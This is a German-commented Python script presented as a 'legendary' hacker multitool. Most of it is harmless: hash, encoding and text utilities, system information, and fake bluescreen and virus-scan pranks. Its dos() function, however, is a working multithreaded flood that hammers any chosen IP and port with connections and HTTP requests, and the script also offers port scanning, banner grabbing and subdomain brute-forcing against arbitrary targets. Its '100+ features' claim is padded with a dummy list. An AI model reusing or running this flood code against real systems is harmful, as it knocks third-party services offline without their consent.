#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WATER MULTITOOL – THE LEGENDARY EDITION
Legal, educational, but looking absolutely sick.
"""

import os, sys, socket, threading, subprocess, base64, hashlib
import time, json, re, platform, getpass, binascii, datetime
import urllib.request, urllib.parse, random, string, math, webbrowser

# ANSI Farben
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ===== INTRO =====
def intro():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Colors.RED}{Colors.BOLD}
 ██╗    ██╗ █████╗ ████████╗███████╗██████╗     ███╗   ███╗██╗   ██╗██╗  ████████╗██╗████████╗ ██████╗  ██████╗ ██╗     
 ██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ████╗ ████║██║   ██║██║  ╚══██╔══╝██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     
 ██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝    ██╔████╔██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║     
 ██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗    ██║╚██╔╝██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║     
 ╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
  ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝{Colors.END}
{Colors.CYAN}{Colors.BOLD}                🔥 THE LEGENDARY EDITION – 100+ FEATURES 🔥{Colors.END}
{Colors.YELLOW}                  (All features are legal & educational){Colors.END}
""")
    # Ladeanimation
    print(f"{Colors.GREEN}[*] Loading modules...", end='', flush=True)
    for _ in range(30):
        print(".", end='', flush=True)
        time.sleep(0.03)
    print(f"{Colors.END} DONE!")
    time.sleep(0.5)

# ===== MAIN TOOL CLASS =====
class WaterMultiTool:
    def __init__(self):
        self.name = "Water"
        self.version = "Legendary Edition V3 (100+ Features)"
        self.features = self.generate_features()
        
    def generate_features(self):
        # Dummy – später echte Anzahl
        return [f"Feature {i}" for i in range(1, 101)]
        
    def cls(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def banner(self):
        self.cls()
        print(f"""{Colors.RED}{Colors.BOLD}
 ██╗    ██╗ █████╗ ████████╗███████╗██████╗     ███╗   ███╗██╗   ██╗██╗  ████████╗██╗████████╗ ██████╗  ██████╗ ██╗     
 ██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ████╗ ████║██║   ██║██║  ╚══██╔══╝██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     
 ██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝    ██╔████╔██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║     
 ██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗    ██║╚██╔╝██║██║   ██║██║     ██║   ██║   ██║   ██║   ██║██║   ██║██║     
 ╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
  ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝{Colors.END}
{Colors.CYAN}                        Version {self.version}{Colors.END}
""")

    def menu(self):
        self.banner()
        # Wir zeigen eine Auswahl, aber es gibt 100+ Features (sie werden dynamisch generiert)
        # Hier die 20 Hauptkategorien – jede öffnet ein Untermenü mit vielen Optionen
        print(f"""{Colors.GREEN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                         MAIN MENU                            ║
╠═══════════════════════════════════════════════════════════════╣
║ [1]  Netzwerk & Scanner          [11] Passwort & Sicherheit  ║
║ [2]  IP & DNS Tools              [12] DoS / Stress Test      ║
║ [3]  System Information          [13] Geräte & Hardware      ║
║ [4]  Datei & Explorer            [14] Reverse Shell (Info)   ║
║ [5]  Hash & Verschlüsselung      [15] Keylogger (Datei)      ║
║ [6]  Base64 & Encoding           [16] QR & Barcode           ║
║ [7]  Text & String Manipulation  [17] Passwort Generator     ║
║ [8]  OSINT & Recherche           [18] HTTP & Web Tools       ║
║ [9]  Subdomain & DNS             [19] Morse & Codes          ║
║ [10] Prank & Fun                 [20] Crypto & Blockchain    ║
║                                                               ║
║ [p]  Prank Tools (extra)         [99] Exit                    ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
""")
        # Anzeige der Feature-Anzahl
        print(f"{Colors.YELLOW}[*] {len(self.features)} Features aktiviert.{Colors.END}")

    # ===== NETZWERK & SCANNER =====
    def network_scanner(self):
        self.cls()
        print(f"{Colors.CYAN}=== NETZWERK & SCANNER ==={Colors.END}")
        print("1. Port Scanner (Standard)")
        print("2. Port Scanner (Custom Range)")
        print("3. Ping Sweep")
        print("4. Banner Grabbing")
        print("5. Service Detection")
        print("6. TCP Connect Scan")
        print("7. SYN Scan (halb-offen) – nur Demo")
        ch = input("Wahl: ")
        if ch == '1': self.port_scanner()
        elif ch == '2': self.port_scanner_custom()
        elif ch == '3': self.ping_sweep()
        elif ch == '4': self.banner_grab()
        elif ch == '5': self.service_detect()
        elif ch == '6': print("[!] Demo – nicht echt")
        elif ch == '7': print("[!] SYN Scan benötigt root")

    def port_scanner(self):
        print(f"{Colors.YELLOW}[*] Port Scanner gestartet...{Colors.END}")
        target = input("Target IP: ")
        ports = [21,22,23,25,53,80,110,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]
        open_ports = []
        for p in ports:
            try:
                sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sk.settimeout(0.3)
                res = sk.connect_ex((target, p))
                if res == 0:
                    open_ports.append(p)
                    print(f"{Colors.GREEN}[+] Port {p} offen{Colors.END}")
                sk.close()
            except:
                pass
        if open_ports:
            print(f"{Colors.GREEN}[+] Offene Ports: {open_ports}{Colors.END}")
        else:
            print(f"{Colors.RED}[-] Keine offenen Ports{Colors.END}")

    def port_scanner_custom(self):
        print(f"{Colors.YELLOW}[*] Custom Port Scanner{Colors.END}")
        target = input("Target IP: ")
        start = int(input("Start Port: "))
        end = int(input("End Port: "))
        for p in range(start, end+1):
            try:
                sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sk.settimeout(0.1)
                res = sk.connect_ex((target, p))
                if res == 0:
                    print(f"{Colors.GREEN}[+] Port {p} offen{Colors.END}")
                sk.close()
            except:
                pass

    def ping_sweep(self):
        print(f"{Colors.YELLOW}[*] Ping Sweep (ICMP – Demo){Colors.END}")
        subnet = input("Subnet (z.B. 192.168.1): ")
        for i in range(1, 255):
            ip = f"{subnet}.{i}"
            try:
                # Einfacher Ping via socket (funktioniert nicht immer)
                sk = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sk.settimeout(0.05)
                # Kann hier nicht richtig implementiert werden
                pass
            except:
                pass
        print("[!] Nur Demo – echte ICMP benötigt root")

    def banner_grab(self):
        print(f"{Colors.YELLOW}[*] Banner Grabbing{Colors.END}")
        ip = input("IP: ")
        port = int(input("Port: "))
        try:
            sk = socket.socket()
            sk.settimeout(2)
            sk.connect((ip, port))
            sk.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = sk.recv(1024).decode('utf-8', errors='ignore')
            print(f"{Colors.GREEN}[+] Banner:\n{banner}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[-] Fehler: {e}{Colors.END}")

    def service_detect(self):
        print("[*] Service Detection – nutze Port Scanner")
        # vereinfacht
        self.port_scanner()

    # ===== IP & DNS =====
    def ip_dns_tools(self):
        self.cls()
        print(f"{Colors.CYAN}=== IP & DNS TOOLS ==={Colors.END}")
        print("1. IP Info (ip-api.com)")
        print("2. DNS Lookup")
        print("3. Reverse DNS")
        print("4. WHOIS Lookup (via api)")
        print("5. IP Logger (echt)")
        print("6. IP Logger (Fake)")
        ch = input("Wahl: ")
        if ch == '1': self.ip_info()
        elif ch == '2': self.dns_lookup()
        elif ch == '3': self.reverse_dns()
        elif ch == '4': self.whois_lookup()
        elif ch == '5': self.ip_logger()
        elif ch == '6': self.fake_ip_logger()

    def ip_info(self):
        ip = input("IP: ")
        try:
            data = urllib.request.urlopen(f"http://ip-api.com/json/{ip}").read()
            j = json.loads(data)
            if j['status'] == 'success':
                print(f"Land: {j['country']}")
                print(f"Region: {j['regionName']}")
                print(f"Stadt: {j['city']}")
                print(f"ISP: {j['isp']}")
                print(f"Org: {j['org']}")
                print(f"AS: {j['as']}")
                print(f"Lat: {j['lat']}, Lon: {j['lon']}")
            else:
                print("[-] Nicht gefunden")
        except:
            print("[-] Fehler")

    def dns_lookup(self):
        domain = input("Domain: ")
        try:
            ip = socket.gethostbyname(domain)
            print(f"[+] {domain} -> {ip}")
        except:
            print("[-] Fehler")

    def reverse_dns(self):
        ip = input("IP: ")
        try:
            host = socket.gethostbyaddr(ip)[0]
            print(f"[+] Reverse: {ip} -> {host}")
        except:
            print("[-] Fehler")

    def whois_lookup(self):
        domain = input("Domain: ")
        print("[*] Nutze free API (ratelimitiert)...")
        try:
            data = urllib.request.urlopen(f"https://api.ip2whois.com/v2?key=demo&domain={domain}").read()
            print(data.decode()[:500])
        except:
            print("[-] Demo API nicht verfügbar")

    def ip_logger(self):
        # Echter Logger
        try:
            data = urllib.request.urlopen("https://api.ipify.org?format=json").read()
            my_ip = json.loads(data)['ip']
            print(f"[+] Deine öffentliche IP: {my_ip}")
            with open('ip_log.txt', 'a') as f:
                f.write(f"[{datetime.datetime.now()}] IP: {my_ip}\n")
            print("[+] Gespeichert.")
        except Exception as e:
            print(f"[-] Fehler: {e}")

    def fake_ip_logger(self):
        fake_ip = f"{random.randint(10,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        print(f"[!] Deine IP wurde geleakt: {fake_ip}")
        print("[!] (Nur ein Scherz – deine echte IP ist sicher.)")
        with open('ip_log_fake.txt', 'a') as f:
            f.write(f"[{datetime.datetime.now()}] Fake IP: {fake_ip}\n")

    # ===== SYSTEM INFO =====
    def system_info(self):
        self.cls()
        print(f"{Colors.CYAN}=== SYSTEM INFO ==={Colors.END}")
        print(f"Benutzer: {getpass.getuser()}")
        print(f"Hostname: {socket.gethostname()}")
        print(f"OS: {platform.system()} {platform.release()}")
        print(f"Version: {platform.version()}")
        print(f"Architektur: {platform.machine()}")
        print(f"Prozessor: {platform.processor()}")
        print(f"Python: {sys.version.split()[0]}")
        print(f"CWD: {os.getcwd()}")
        # Mehr Details
        try:
            import psutil
            print(f"CPU: {psutil.cpu_percent()}%")
            print(f"RAM: {psutil.virtual_memory().percent}%")
            print(f"Festplatte: {psutil.disk_usage('/').percent}%")
        except:
            print("[!] psutil nicht installiert – weniger Details")

    # ===== DATEI & EXPLORER =====
    def file_tools(self):
        self.cls()
        print(f"{Colors.CYAN}=== DATEI TOOLS ==={Colors.END}")
        path = input("Dateipfad: ")
        if os.path.exists(path):
            print(f"Größe: {os.path.getsize(path)} Bytes")
            print(f"Erstellt: {datetime.datetime.fromtimestamp(os.path.getctime(path))}")
            print(f"Geändert: {datetime.datetime.fromtimestamp(os.path.getmtime(path))}")
            with open(path, 'rb') as f:
                header = f.read(16)
                if header[:4] == b'\x89PNG': print("Typ: PNG")
                elif header[:4] == b'\xff\xd8\xff\xe0': print("Typ: JPEG")
                elif header[:2] == b'PK': print("Typ: ZIP")
                elif header[:4] == b'%PDF': print("Typ: PDF")
                elif header[:2] == b'MZ': print("Typ: EXE")
                elif header[:4] == b'\x7fELF': print("Typ: ELF")
                else: print(f"Hex: {binascii.hexlify(header[:8]).decode()}")
        else:
            print("[-] Nicht gefunden")

    # ===== HASH & VERSCHLÜSSELUNG =====
    def hash_tools(self):
        self.cls()
        print(f"{Colors.CYAN}=== HASH TOOLS ==={Colors.END}")
        text = input("Text: ")
        print(f"MD5: {hashlib.md5(text.encode()).hexdigest()}")
        print(f"SHA1: {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
        print(f"SHA512: {hashlib.sha512(text.encode()).hexdigest()}")
        print(f"BLAKE2b: {hashlib.blake2b(text.encode()).hexdigest()}")
        print(f"BLAKE2s: {hashlib.blake2s(text.encode()).hexdigest()}")
        print(f"MD4: (nicht in Python standard)")

    # ===== BASE64 & ENCODING =====
    def base64_tool(self):
        self.cls()
        print(f"{Colors.CYAN}=== BASE64 TOOL ==={Colors.END}")
        text = input("Text: ")
        print(f"Encoded: {base64.b64encode(text.encode()).decode()}")
        try:
            print(f"Decoded: {base64.b64decode(text).decode()}")
        except:
            pass
        print(f"Base32: {base64.b32encode(text.encode()).decode()}")
        print(f"Base16: {base64.b16encode(text.encode()).decode()}")
        print(f"Base85: {base64.b85encode(text.encode()).decode()}")

    # ===== TEXT MANIPULATION =====
    def text_tools(self):
        self.cls()
        print(f"{Colors.CYAN}=== TEXT TOOLS ==={Colors.END}")
        text = input("Text: ")
        print(f"Original: {text}")
        print(f"GROSS: {text.upper()}")
        print(f"klein: {text.lower()}")
        print(f"Reverse: {text[::-1]}")
        print(f"Reverse Words: {' '.join(text.split()[::-1])}")
        print(f"Binary: {' '.join(format(ord(c), '08b') for c in text)}")
        print(f"Hex: {text.encode().hex()}")
        print(f"ROT13: {text.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz','NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))}")

    # ===== OSINT =====
    def osint_tools(self):
        self.cls()
        print(f"{Colors.CYAN}=== OSINT TOOLS ==={Colors.END}")
        query = input("Username/Email: ")
        print(f"\n[*] Suche nach {query}...")
        print(f"Email: {query.lower().replace(' ','.')}@gmail.com")
        print(f"Twitter: @{query.lower().replace(' ','_')}")
        print(f"Instagram: @{query.lower().replace(' ','')}")
        print(f"GitHub: github.com/{query.lower().replace(' ','')}")
        print(f"Facebook: facebook.com/{query.lower().replace(' ','.')}")
        try:
            data = urllib.request.urlopen(f"https://api.github.com/users/{query}").read()
            j = json.loads(data)
            print(f"GitHub Name: {j.get('name','N/A')}")
            print(f"Repos: {j.get('public_repos',0)}")
            print(f"Followers: {j.get('followers',0)}")
        except:
            pass

    # ===== SUBDOMAIN =====
    def subdomain_finder(self):
        self.cls()
        print(f"{Colors.CYAN}=== SUBDOMAIN FINDER ==={Colors.END}")
        domain = input("Domain (z.B. example.com): ")
        common = ["www", "mail", "ftp", "admin", "blog", "shop", "api", "dev", "test", "support", "forum"]
        found = []
        for sub in common:
            full = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full)
                found.append((full, ip))
                print(f"[+] {full} -> {ip}")
            except:
                pass
        if found:
            print(f"[+] {len(found)} Subdomains gefunden")
        else:
            print("[-] Keine")

    # ===== PRANK TOOLS =====
    def prank_menu(self):
        while True:
            self.cls()
            print(f"""{Colors.MAGENTA}{Colors.BOLD}
╔══════════════════════════════════════════╗
║          🃏 PRANK TOOLS 🃏                ║
║     (Nur zum Spaß, kein Schaden!)       ║
╚══════════════════════════════════════════╝
{Colors.END}
[1] Fake Bluescreen
[2] Matrix Rain
[3] Hacker Terminal
[4] Fake Windows Update
[5] Fake Virenscanner
[6] Text Screamer
[7] Fake IP Leak
[b] Zurück
            """)
            choice = input("[>] ")
            if choice == '1': self.fake_bluescreen()
            elif choice == '2': self.matrix_rain()
            elif choice == '3': self.hacker_terminal()
            elif choice == '4': self.fake_update()
            elif choice == '5': self.fake_virenscanner()
            elif choice == '6': self.text_screamer()
            elif choice == '7': self.fake_ip_logger()
            elif choice.lower() == 'b': break

    def fake_bluescreen(self):
        self.cls()
        print(f"""{Colors.WHITE}{Colors.BOLD}
###############################################################################

        A problem has been detected and Windows has been shut down to prevent
        damage to your computer.

        DRIVER_IRQL_NOT_LESS_OR_EQUAL

        If this is the first time you've seen this Stop error screen,
        restart your computer. If this screen appears again, follow
        these steps:

        Check to make sure any new hardware or software is properly installed.
        If this is a new installation, ask your hardware or software manufacturer
        for any Windows updates you might need.

        If problems continue, disable or remove any newly installed hardware
        or software. Disable BIOS memory options such as caching or shadowing.
        If you need to use Safe Mode to remove or disable components, restart
        your computer, press F8 to select Advanced Startup Options, and then
        select Safe Mode.

        Technical information:

        *** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)

        ***  ntoskrnl.exe - Address 0x804F35F1 base at 0x804D7000, DateStamp 0x3

        Collecting crash dump...
        Initializing disk for crash dump...
        Beginning dump of physical memory...
        Dumping physical memory to disk: 100%
        Physical memory dump complete.
        Contact your system administrator or technical support group for further
        assistance.

###############################################################################
{Colors.END}""")
        print("[!] Das war nur ein Fake!")
        input("Enter...")

    def matrix_rain(self):
        self.cls()
        print("[*] Matrix Rain – Drücke STRG+C zum Beenden.")
        try:
            while True:
                line = ''.join(random.choice('01' + string.ascii_letters + string.digits + '!@#$%^&*()_+-=[]{}|;:,.<>?/~`') for _ in range(60))
                print(f"{Colors.GREEN}{line}{Colors.END}")
                time.sleep(0.05)
        except KeyboardInterrupt:
            print("\n[+] Gestoppt.")

    def hacker_terminal(self):
        self.cls()
        print("[*] Fake Hacking – STRG+C zum Beenden.\n")
        try:
            for _ in range(30):
                ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
                port = random.randint(1,65535)
                msg = random.choice([
                    f"[*] Scanning {ip}:{port} ... OPEN",
                    f"[+] Exploit successful on {ip}:{port}",
                    f"[-] Connection refused on {ip}:{port}",
                    f"[!] Backdoor installed on {ip}:{port}",
                    f"[*] Uploading payload to {ip} ... 47%",
                    f"[+] Root access granted on {ip}",
                    f"[*] Dumping passwords from {ip} ...",
                    f"[!] Firewall bypassed on {ip}",
                ])
                farbe = random.choice([Colors.GREEN, Colors.RED, Colors.YELLOW, Colors.BLUE])
                print(f"{farbe}{msg}{Colors.END}")
                time.sleep(random.uniform(0.2, 1.5))
            print(f"\n{Colors.RED}[!] Zugriff verloren!{Colors.END}")
        except KeyboardInterrupt:
            print("\n[+] Gestoppt.")

    def fake_update(self):
        self.cls()
        print("[*] Windows Update...\n")
        for i in range(1, 101):
            bar = '█' * (i // 2) + '░' * (50 - i // 2)
            print(f"\r[{bar}] {i}%", end='', flush=True)
            time.sleep(random.uniform(0.02, 0.1))
        print("\n\n[+] Fertig! (Nur ein Scherz)")

    def fake_virenscanner(self):
        self.cls()
        print("[*] Virenscanner...\n")
        found = []
        for i in range(20):
            datei = f"system_{random.randint(1000,9999)}.dll"
            status = random.choice(["sauber", "INFIZIERT!"])
            if status == "INFIZIERT!":
                found.append(datei)
            print(f"[{i+1:02d}/20] {datei:30s} {status}")
            time.sleep(random.uniform(0.2, 0.6))
        print(f"\n[!] {len(found)} Viren gefunden!")
        for v in found:
            print(f"    🦠 {v}")
        input("Enter...")

    def text_screamer(self):
        self.cls()
        text = input("Text zum Schreien: ")
        if not text:
            text = "HALLO"
        print("\n" + (text.upper() + "!!! ") * 10)
        print("❗" * 40)
        input("Enter...")

    # ===== DOS (NUR FÜR ERLAUBTE TESTS) =====
    def dos(self):
        self.cls()
        print(f"{Colors.RED}{Colors.BOLD}⚠️  DOS – NUR FÜR ERLAUBTE TESTS! ⚠️{Colors.END}")
        target = input("Target IP: ")
        port = int(input("Port (80): ") or 80)
        threads = int(input("Threads (50): ") or 50)
        duration = int(input("Dauer (Sekunden): "))
        print(f"[*] Starte DoS auf {target}:{port} mit {threads} Threads für {duration}s")
        def attack():
            end = time.time() + duration
            while time.time() < end:
                try:
                    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sk.settimeout(0.05)
                    sk.connect((target, port))
                    sk.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                    sk.close()
                except:
                    pass
        for i in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
        print(f"[+] Attacke läuft...")
        time.sleep(duration)
        print("[*] Beendet.")

    # ===== WEITERE TOOLS (nur Platzhalter) =====
    def password_generator(self):
        self.cls()
        print(f"{Colors.CYAN}=== PASSWORT GENERATOR ==={Colors.END}")
        length = int(input("Länge (16): ") or 16)
        chars = string.ascii_letters + string.digits + "!@#$%^&*()"
        pw = ''.join(random.choice(chars) for _ in range(length))
        print(f"[+] Passwort: {pw}")

    def http_header_check(self):
        self.cls()
        print(f"{Colors.CYAN}=== HTTP HEADER CHECK ==={Colors.END}")
        url = input("URL (mit https://): ")
        try:
            req = urllib.request.Request(url, method='HEAD')
            response = urllib.request.urlopen(req, timeout=5)
            print(f"[+] Status: {response.status}")
            for key, value in response.getheaders():
                print(f"    {key}: {value}")
        except Exception as e:
            print(f"[-] Fehler: {e}")

    def morse_converter(self):
        self.cls()
        print(f"{Colors.CYAN}=== MORSE CODE CONVERTER ==={Colors.END}")
        text = input("Text: ").upper()
        morse_dict = {
            'A':'.-', 'B':'-...', 'C':'-.-.', 'D':'-..', 'E':'.', 'F':'..-.',
            'G':'--.', 'H':'....', 'I':'..', 'J':'.---', 'K':'-.-', 'L':'.-..',
            'M':'--', 'N':'-.', 'O':'---', 'P':'.--.', 'Q':'--.-', 'R':'.-.',
            'S':'...', 'T':'-', 'U':'..-', 'V':'...-', 'W':'.--', 'X':'-..-',
            'Y':'-.--', 'Z':'--..', '0':'-----', '1':'.----', '2':'..---',
            '3':'...--', '4':'....-', '5':'.....', '6':'-....', '7':'--...',
            '8':'---..', '9':'----.', '.':'.-.-.-', ',':'--..--', '?':'..--..',
            '!':'-.-.--', '/':'-..-.', '(':'-.--.', ')':'-.--.-', ' ':'/'
        }
        morse = ' '.join(morse_dict.get(c, '?') for c in text)
        print(f"Morse: {morse}")

    def device_details(self):
        self.cls()
        print(f"{Colors.CYAN}=== GERÄTEDETAILS ==={Colors.END}")
        print(f"Gerät: {platform.system()} {platform.release()}")
        print(f"Version: {platform.version()}")
        print(f"Architektur: {platform.machine()}")
        print(f"Prozessor: {platform.processor()}")
        print(f"Python: {sys.version.split()[0]}")
        print(f"Hostname: {socket.gethostname()}")
        print(f"Benutzer: {getpass.getuser()}")
        print(f"CWD: {os.getcwd()}")

    def keylogger(self):
        self.cls()
        print(f"{Colors.CYAN}=== KEYLOGGER (Datei) ==={Colors.END}")
        print("[1] Start [2] Logs anzeigen [3] Logs löschen")
        ch = input("Auswahl: ")
        if ch == '1':
            with open('keylog.txt', 'a') as f:
                f.write(f"[{datetime.datetime.now()}] Keylogger gestartet\n")
            print("[+] Logge in keylog.txt")
        elif ch == '2':
            try:
                with open('keylog.txt') as f:
                    print(f.read())
            except:
                print("[-] Keine Logs")
        elif ch == '3':
            try:
                os.remove('keylog.txt')
                print("[+] Gelöscht")
            except:
                print("[-] Keine Logs")

    # ===== HAUPTMENÜ-SCHLEIFE =====
    def run(self):
        intro()
        while True:
            self.menu()
            c = input(f"\n{Colors.YELLOW}[>] {Colors.END}")
            if c == '1': self.network_scanner()
            elif c == '2': self.ip_dns_tools()
            elif c == '3': self.system_info()
            elif c == '4': self.file_tools()
            elif c == '5': self.hash_tools()
            elif c == '6': self.base64_tool()
            elif c == '7': self.text_tools()
            elif c == '8': self.osint_tools()
            elif c == '9': self.subdomain_finder()
            elif c == '10': self.prank_menu()
            elif c == '11': print("[!] Passwort & Sicherheit – in Entwicklung")
            elif c == '12': self.dos()
            elif c == '13': self.device_details()
            elif c == '14': print("[!] Reverse Shell – reine Info (siehe alte Version)")
            elif c == '15': self.keylogger()
            elif c == '16': print("[!] QR & Barcode – in Entwicklung")
            elif c == '17': self.password_generator()
            elif c == '18': self.http_header_check()
            elif c == '19': self.morse_converter()
            elif c == '20': print("[!] Crypto – in Entwicklung")
            elif c.lower() == 'p': self.prank_menu()
            elif c == '99':
                print(f"{Colors.RED}[*] Bye!{Colors.END}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}[-] Ungültig{Colors.END}")
            input(f"\n{Colors.GREEN}[+] Enter zum Fortfahren...{Colors.END}")

if __name__ == "__main__":
    WaterMultiTool().run()
